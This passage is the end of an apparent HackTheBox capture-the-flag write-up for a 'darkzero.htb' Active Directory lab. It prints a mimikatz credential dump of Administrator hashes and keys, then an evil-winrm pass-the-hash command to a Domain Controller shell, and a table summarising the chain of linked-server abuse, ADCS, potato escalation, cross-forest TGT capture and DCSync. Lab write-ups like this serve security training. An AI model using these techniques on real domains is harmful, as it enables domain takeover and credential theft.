    Default Salt : DARKZERO.HTBAdministrator
    Default Iterations : 4096
    Credentials
      des_cbc_md5_nt    (4096) : 2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
      unknow            (4096) : a23315d970fe9d556be03ab611730673
      aes256_hmac       (4096) : d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
      aes128_hmac       (4096) : b1e04b87abab7be2c600fc652ac84362
      rc4_hmac_nt       (4096) : 5917507bdf2ef2c2b0a869a1cba40726
    ServiceCredentials
      des_cbc_md5_nt    (4096) : 2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
      unknow            (4096) : a23315d970fe9d556be03ab611730673
      aes256_hmac       (4096) : d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
      aes128_hmac       (4096) : b1e04b87abab7be2c600fc652ac84362
    OldCredentials
      des_cbc_md5_nt    (4096) : 298bc77657a3737b452bb09be407d46b795774e5c3bbfcc68e8f0a4015b59459
      unknow            (4096) : d1d84cca796daa8d9dda56c9fbd29110
      aes256_hmac       (4096) : fe0ba028010ee4f408ebc846d3f480c1880a4f0274acdb226d3afcdc3595dc21
      aes128_hmac       (4096) : a2a7e0e9a4b5ade57242b3e97756dca3
      rc4_hmac_nt       (4096) : 5917507bdf2ef2c2b0a869a1cba40726
    OlderCredentials
      des_cbc_md5_nt    (4096) : d828032ab803aa2d52a9db423de22fe27af55a9fd2101037b106e856ef515216
      unknow            (4096) : 5f9f4fbb6a67b92e5ec7b34c3ba9d322
      aes256_hmac       (4096) : ead37d7deb508c2ad7fd748960cb115d0857b23d95a69cfc95fa693d9d2ca987
      aes128_hmac       (4096) : d027d6dfa67d37190ea37579b948874a
      rc4_hmac_nt       (4096) : cf3a5525ee9414229e66279623ed5c58

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  059775b62c039e3def2ae0dd3cf5fdeb
    02  cd2cdff8fba2798b8f5736af3b0617e2
    03  f807da3ed4e91404a7b9e87915b92114
    04  059775b62c039e3def2ae0dd3cf5fdeb
    05  3209c6585c69e581da8b23ad280d48aa
    06  c75dced3815eff7f99a6ef67018be23e
    07  0fca3845bf99227b23ac897eb7e7246d
    08  7d1a78d4cc10d91caf276f70790866c2
    09  cec6c4e88dbb2e0b2cf3c87ff44cd372
    10  81ee716a17e92b26d65b932c55ceaa54
    11  5a808b7dd291f85e64e53439a7520d42
    12  7d1a78d4cc10d91caf276f70790866c2
    13  c421d8af0cfd4330cf4312d05e135127
    14  47b49319d1bb83cc2f6fc2767acb9dc6
    15  13ad2c29ee304491557ebfef55693708
    16  7f8a2135bf0aac335296f86f84660fb0
    17  fa7267a1c55c45633b83a34d05f0056f
    18  b8f360edd930f882d000d03bc07d0973
    19  8ed43db2829682a63b52f73037ea654b
    20  276189d18309b00e3e36f4fc3b936677
    21  1726c96c2c2998836f09fe572eada8d9
    22  bdbd5d774b16233eab9c00804b12601a
    23  9131f6686281d29fc473b940d1a1c022
    24  2e1e69803702ba4e530debd3b5d5ee74
    25  1b79e43d6f356574fdab541ec4ebe0b8
    26  e64552e3066c37621f8a7132b64b3a15
    27  bd8a3360652182c95cbc4c54553f330f
    28  9e10974f986144193c8499681c658880
    29  61c17ed3d006e5d2d56c2b2f86e0bdd2


mimikatz(commandline) # exit
Bye!
```

---

## Root — Shell as Administrator on DC01

Using the Administrator NT hash to login via Evil-WinRM:

```bash
evil-winrm -i darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt

76b48a037f18cd46bf7b1bfd44e34191
```

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| MSSQL Enum | Linked server discovery | Code exec as `svc_sql` on DC02 |
| Pivoting | Ligolo-ng tunnel | Reach 172.16.20.0/24 |
| ADCS | Certificate enrollment + Certipy | NT hash for `svc_sql` |
| Password Change | changepasswd.py | Known password for `svc_sql` |
| Token Recovery | RunasCs (logon type 5) | `SeImpersonatePrivilege` |
| LPE | SigmaPotato | SYSTEM on DC02 |
| Cross-Forest Abuse | Rubeus monitor + SpoolSample | DC01$ TGT captured |
| DCSync | SafetyKatz via DC01$ ptt | Admin hash for `darkzero.htb` |
| Root | Evil-WinRM pass-the-hash | `root.txt` on DC01 |

---

## Key Takeaways

- **MSSQL Linked Servers** are a critical inter-domain lateral movement vector — always enumerate them and check for privilege differences.
- **ADCS User template** enrollment by a service account can be abused to recover the account's NT hash via PKINIT authentication.
- **Service Logon (`SeServiceLogonRight`)** can restore `SeImpersonatePrivilege` when a restricted shell strips it — `RunasCs` with `--logon-type 5` is the key.
- **Cross-forest TGT delegation** (`TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`) is an often-overlooked trust attribute that allows full cross-forest compromise when combined with SYSTEM on the trusted domain's DC.
